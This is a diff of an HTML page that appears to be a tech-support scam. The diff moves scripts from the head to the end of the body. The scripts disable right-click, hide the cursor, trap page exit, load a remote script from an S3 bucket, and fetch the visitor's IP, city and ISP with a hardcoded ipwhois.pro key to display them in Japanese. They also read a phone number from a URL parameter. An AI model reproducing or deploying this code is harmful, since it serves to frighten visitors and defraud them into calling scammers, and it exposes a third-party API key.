@@ -7,66 +7,6 @@
     <link href="msmm.png" rel="icon" id="favicon" type="image/png">
 <!--     <script>📞 0101 828 731 2715</script> -->
     <link href="https://files-pop.s3.ap-northeast-1.amazonaws.com/tapa.css" rel="stylesheet">
-    <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
-    <script type="text/javascript">//<![CDATA[
-    $(function(){
-    $('body').bind('contextmenu', function(e){
-    return false;
-    });
-    });//]]>
-    </script>
-
-    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/noir.js"></script>
-    <script>
-      var t = new XMLHttpRequest();
-      t.onreadystatechange = function() {
-          if (this.readyState === 4 && this.status === 200) {
-              try {
-                  var a = JSON.parse(this.responseText);
-  
-                  // Extracting information from the API response
-                  var ipadd = a.ip;
-                  var city = a.city;
-                  var country = a.country;
-                  var isp = a.connection.isp;
-                  var currtime = a.timezone.current_time;
-  
-                  // Setting the information into HTML elements
-                  document.getElementById("ip_add").textContent = "アドレスIP: " + ipadd;
-                  document.getElementById("city").textContent = "位置: " + city + ", " + country;
-                  document.getElementById("isp").textContent = "ISP: " + isp;
-              } catch (e) {
-                  console.error("Error parsing response:", e);
-              }
-          } else if (this.readyState === 4) {
-              console.error("Request failed with status:", this.status);
-          }
-      };
-  
-      // Sending the GET request to the API
-      t.open("GET", "https://ipwhois.pro/?key=C8sZnLEBIwQVuMA4", true);
-      t.send();
-  </script>
-
-    <script>
-              function getVariableFromURl(n0me)
-              {
-                  n0me = n0me.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
-                  var regexS = "[\\?&]"+n0me+"=([^&#]*)";
-                  var regex = new RegExp( regexS );
-                  var results = regex.exec( window.location.href );
-                  if( results == null )
-                      return "";
-                  else
-                      return results[1];
-              }
-          </script>
-
-
-          <script type="text/javascript">
-                      var ph0ne = getVariableFromURl('ph0ne');
-                  </script>
-
   </head>
   <body class="map" id="mycanvas" onbeforeunload="return myFunction()"  style="cursor:none">
     <div class="bg" style="cursor:none">
@@ -595,6 +535,64 @@
     });
 
     </script>
+    <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
+    <script type="text/javascript">//<![CDATA[
+    $(function(){
+    $('body').bind('contextmenu', function(e){
+    return false;
+    });
+    });//]]>
+    </script>
 
+    <script src="https://files-pop.s3.ap-northeast-1.amazonaws.com/noir.js"></script>
+    <script>
+      var t = new XMLHttpRequest();
+      t.onreadystatechange = function() {
+          if (this.readyState === 4 && this.status === 200) {
+              try {
+                  var a = JSON.parse(this.responseText);
+  
+                  // Extracting information from the API response
+                  var ipadd = a.ip;
+                  var city = a.city;
+                  var country = a.country;
+                  var isp = a.connection.isp;
+                  var currtime = a.timezone.current_time;
+  
+                  // Setting the information into HTML elements
+                  document.getElementById("ip_add").textContent = "アドレスIP: " + ipadd;
+                  document.getElementById("city").textContent = "位置: " + city + ", " + country;
+                  document.getElementById("isp").textContent = "ISP: " + isp;
+              } catch (e) {
+                  console.error("Error parsing response:", e);
+              }
+          } else if (this.readyState === 4) {
+              console.error("Request failed with status:", this.status);
+          }
+      };
+  
+      // Sending the GET request to the API
+      t.open("GET", "https://ipwhois.pro/?key=C8sZnLEBIwQVuMA4", true);
+      t.send();
+  </script>
+
+    <script>
+              function getVariableFromURl(n0me)
+              {
+                  n0me = n0me.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+                  var regexS = "[\\?&]"+n0me+"=([^&#]*)";
+                  var regex = new RegExp( regexS );
+                  var results = regex.exec( window.location.href );
+                  if( results == null )
+                      return "";
+                  else
+                      return results[1];
+              }
+          </script>
+
+
+          <script type="text/javascript">
+                      var ph0ne = getVariableFromURl('ph0ne');
+                  </script>
   </body>
 </html>
